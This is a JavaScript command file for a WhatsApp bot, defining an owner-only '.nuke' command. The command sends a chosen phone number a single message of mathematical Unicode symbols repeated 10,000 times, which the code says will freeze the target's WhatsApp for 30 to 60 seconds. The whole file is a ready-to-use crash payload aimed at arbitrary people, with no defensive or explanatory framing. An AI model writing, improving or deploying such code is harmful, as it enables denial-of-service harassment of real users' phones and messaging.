const settings = require('../../settings');
const logger = require('../../lib/logger');

module.exports = {
    name: 'nuke',
    aliases: ['overheat', 'crash3'],
    category: 'owner',
    description: 'Send a math payload that freezes WhatsApp',
    usage: '.nuke <number>',
    ownerOnly: true,
    react: '☢️',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        const targetNum = (args[0] || '').replace(/[^0-9]/g, '');
        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid number. Example: ${settings.prefix}nuke 254712345678` }, { quoted: mek });
        }

        const jid = targetNum + '@s.whatsapp.net';
        await conn.sendMessage(chatId, { text: `☢️ *Deploying Local Nuke...*` }, { quoted: mek });

        try {
            // The "Math" payload. 
            // We use complex mathematical unicode symbols repeated thousands of times.
            // WhatsApp tries to calculate the spacing for every single symbol.
            const mathSymbols = '∑∏∫√∞≈≠≤≥';
            // 10,000 repetitions
            const payload = mathSymbols.repeat(10000); 

            // We send it as a single message
            await conn.sendMessage(jid, { text: payload });
            
            await conn.sendMessage(chatId, { text: `✅ *Nuke Deployed!*\n\nCheck the target phone. It should freeze for 30-60 seconds.` }, { quoted: mek });
            
        } catch (error) {
            logger.error(`[NUKE] Error: ${error.message}`);
            await conn.sendMessage(chatId, { text: `❌ Failed: ${error.message}` }, { quoted: mek });
        }
    }
};